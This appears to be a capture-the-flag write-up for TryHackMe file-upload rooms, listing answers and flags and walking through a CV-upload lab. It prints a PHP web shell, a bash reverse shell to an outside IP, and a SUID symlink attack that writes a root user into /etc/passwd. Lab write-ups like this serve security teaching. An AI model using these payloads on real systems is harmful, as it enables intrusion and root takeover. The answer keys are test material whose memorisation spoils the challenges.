@@ -1,0 +1,185 @@
+MWR-CyberSec-Week-9-RCE-and-F1le-Upload
+
+Overwrite the image. What is the flag you receive?
+ THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}
+Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?
+(N.B. This is a good habit to get into, and will serve you well in the upcoming tasks…)
+/resources
+
+Get either a web shell or a reverse shell on the machine. What’s the flag in the /var/www/ directory of the server?
+ THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}
+What is the traditionally predominant server-side scripting language?
+PHP
+When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?
+
+ Whitelist
+[Research] What MIME type would you expect to see when uploading a CSV file?
+text/csv
+What is the flag in /var/www/?
+THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}
+ 
+What is the flag in /var/www/?
+
+THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}
+Grab the flag from /var/www/
+THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}
+Hack the machine and grab the flag from /var/www/
+THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
+
+
+The "Plain CV Drop" room is a PHP-based file upload application built to simulate a real-world CV submission portal. The attack chain involves bypassing file upload restrictions to achieve Remote Code Execution (RCE), then abusing a SUID binary to escalate privileges to root.
+Flags:
+
+User: THM{0d761960-d1d9-40c1-98ff-1ce525a36d3c}
+Root: THM{57e78446-a7de-48c4-aa9b-678bdd5b259e}
+
+
+Reconnaissance
+Navigating to http://10.114.174.16/ revealed a clean CV upload form accepting the following file types: PDF, DOC, DOCX, ODT, and TXT. The page source exposed key details:
+
+Upload endpoint: upload.php
+CSRF token protection via hidden form field
+A review page at review.php (no password protection — misconfiguration)
+
+html<input type="hidden" name="csrf" value="..." />
+<form method="post" action="upload.php" enctype="multipart/form-data">
+Running Gobuster against the target revealed two critical findings:
+/uploads.jsonl   (Status: 200)
+/uploads         (Status: 301)
+/review.php      (Status: 200)
+The uploads.jsonl file was publicly accessible and contained metadata for every uploaded file including the randomized stored filename — a critical information disclosure vulnerability.
+
+Exploitation — File Upload Bypass
+Attempt 1: PHP extension (blocked)
+Uploading shell.php with Content-Type: application/pdf returned a 302 redirect — the server rejected it silently.
+Attempt 2: PHP content in .txt (MIME check bypass)
+Uploading raw PHP code as shell.txt returned "Invalid MIME type" — the server used finfo to check actual file contents.
+Solution: Embed PHP in plain text content
+By wrapping the PHP payload inside a realistic plain-text CV, the finfo MIME check detected it as text/plain and accepted it:
+John Doe
+Software Engineer
+...
+<?php system($_GET["cmd"]); ?>
+Upload was accepted. The file was confirmed in the review page as shell.txt.
+Burp Suite intercept — rename to .phtml
+Using Burp Suite to intercept the upload request, the filename was changed from shell.txt to shell.phtml before forwarding. The server's extension blacklist did not include .phtml.
+The uploads.jsonl log confirmed the stored filename:
+json{"id":"ccbe94d9909623a1","stored_name":"ccbe94d9909623a1.phtml","orig_name":"shell.phtml",...}
+RCE Confirmed
+bashcurl "http://10.114.174.16/uploads/ccbe94d9909623a1.phtml?cmd=id"
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Post-Exploitation
+Reverse Shell
+A reverse shell was established using:
+bash# Attacker (Kali)
+nc -lvnp 4444
+
+# Via webshell
+bash -c 'bash -i >& /dev/tcp/192.168.177.11/4444 0>&1'
+User Flag
+bashcat /var/www/user.txt
+# THM{0d761960-d1d9-40c1-98ff-1ce525a36d3c}
+
+Privilege Escalation — SUID Binary Abuse
+Enumerating SUID binaries revealed a non-standard binary:
+bashfind / -perm -4000 -type f 2>/dev/null
+# /usr/local/bin/patch_note
+The patch_note binary runs as root and appends user-supplied input to /var/www/patch_history. Since /var/www/patch_history was world-writable and the directory was writable by www-data, the file could be replaced with a symlink to /etc/passwd.
+Steps:
+1. Upgrade to interactive shell:
+bashpython3 -c 'import pty;pty.spawn("/bin/bash")'
+2. Generate password hash:
+bashopenssl passwd -1 hacked123
+# $1$UDbsHWzy$uD0wH2HAgSXMEMTdCbwtU.
+3. Symlink patch_history to /etc/passwd:
+bashrm -f /var/www/patch_history
+ln -sf /etc/passwd /var/www/patch_history
+4. Run SUID binary and append new root user:
+bash/usr/local/bin/patch_note
+# Enter a line to append:
+hacker:$1$UDbsHWzy$uD0wH2HAgSXMEMTdCbwtU.:0:0:root:/root:/bin/bash
+5. Switch to new root user:
+bashsu hacker
+# password: hacked123
+cat /root/root.txt
+# THM{57e78446-a7de-48c4-aa9b-678bdd5b259e}
+
+Vulnerabilities Summary
+#VulnerabilityImpact1Unauthenticated review pageExposes all uploaded submissions2uploads.jsonl publicly accessibleDiscloses randomized stored filenames3Incomplete extension blacklist (.phtml allowed)PHP code execution4MIME check bypassable via text wrappingFilter bypass5SUID binary writes to world-symlink-able pathPrivilege escalation to root
+
+Remediation Recommendations
+
+Whitelist file extensions rather than blacklisting — only allow PDF, DOC, DOCX, ODT, TXT explicitly
+Serve uploads through a PHP script that sets correct Content-Disposition headers rather than serving from a web-accessible directory
+Protect the review page with strong authentication — not just a shared password
+Remove public access to uploads.jsonl — serve it only through authenticated endpoints
+Fix the SUID binary to resolve the target path at install time rather than using a runtime-configurable file
+Use realpath() checks in the SUID binary to prevent symlink attacks
+
+
+Tools Used
+
+curl — manual HTTP requests and file upload
+gobuster — directory and file enumeration
+Burp Suite — intercept and modify upload request
+netcat — reverse shell listener
+openssl — password hash generation
+
+
+Key Concepts
+Finding the Upload Path
+A critical step in exploiting file upload vulnerabilities is locating where uploaded files are stored on the server. Tools like Gobuster or Dirbuster are used to brute-force directory names and discover the upload path.
+bashgobuster dir -u http://10.114.174.16/ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,txt,jsonl,log \
+  -t 50
+In this room, Gobuster revealed:
+
+/uploads — the directory where files are stored and served
+/uploads.jsonl — a publicly exposed log file containing the randomized stored filenames
+
+Once the upload directory is identified, the attacker can access the uploaded web shell directly by navigating to the correct path, e.g. http://target/uploads/shell.phtml?cmd=id.
+
+Bypassing Client-Side Filters
+Many web applications implement client-side filtering to restrict which file types can be uploaded. These filters operate entirely within the user's browser using JavaScript or HTML accept attributes and are trivially bypassed because they are never enforced on the server.
+In this room the upload form declared accepted types via HTML capsules (PDF, DOC, DOCX, ODT, TXT), but this was purely presentational. Using Burp Suite, the attacker intercepted the upload HTTP request mid-flight and modified the filename field from shell.txt to shell.phtml before it reached the server:
+# Original intercepted request
+Content-Disposition: form-data; name="cv"; filename="shell.txt"
+Content-Type: text/plain
+
+# Modified in Burp
+Content-Disposition: form-data; name="cv"; filename="shell.phtml"
+Content-Type: text/plain
+The server accepted the modified request because its extension blacklist did not include .phtml as a blocked extension — a classic example of a blacklist being less secure than a whitelist.
+
+Uploading a Web Shell
+A PHP web shell is a simple script that accepts operating system commands via HTTP GET parameters and executes them on the server, returning the output to the attacker's browser.
+The shell used in this room:
+php<?php system($_GET["cmd"]); ?>
+To bypass the server-side MIME type check (which used PHP's finfo to inspect file contents), the PHP payload was embedded inside realistic plain-text CV content. This caused finfo to detect the file as text/plain rather than text/x-php:
+John Doe
+Software Engineer
+john.doe@email.com
+
+EXPERIENCE
+Senior Developer at TechCorp 2020-2024
+...
+
+<?php system($_GET["cmd"]); ?>
+The file was then uploaded as .txt (accepted by MIME check), and Burp Suite was used to rename it to .phtml so Apache would execute it as PHP. Once uploaded, the web shell was triggered by navigating to:
+http://10.114.174.16/uploads/ccbe94d9909623a1.phtml?cmd=id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Conclusion
+After successfully uploading the malicious .phtml web shell, a reverse shell connection was established back to the attacker's Kali machine using Netcat, giving full interactive access to the server as www-data.
+From there:
+
+The user flag was found at /var/www/user.txt
+A custom SUID binary (/usr/local/bin/patch_note) was identified and abused by symlinking its target file to /etc/passwd, allowing a new root-level user to be injected
+The root flag was retrieved from /root/root.txt
+
+This room demonstrates that file upload vulnerabilities remain one of the most impactful classes of web vulnerabilities. Even when multiple layers of filtering are in place (MIME checks, extension checks, CSRF protection), a combination of techniques — content wrapping, Burp Suite interception, and extension blacklist gaps — can defeat them entirely.
+
+TryHackMe Room — Key Answers
+QuestionAnswerWhat is the traditionally predominant server-side scripting language?PHPWhen validating by file extension, what do you call a list of accepted extensions?WhitelistWhat MIME type would you expect when uploading a CSV file?text/csvUser flagTHM{0d761960-d1d9-40c1-98ff-1ce525a36d3c}Root flagTHM{57e78446-a7de-48c4-aa9b-678bdd5b259e}
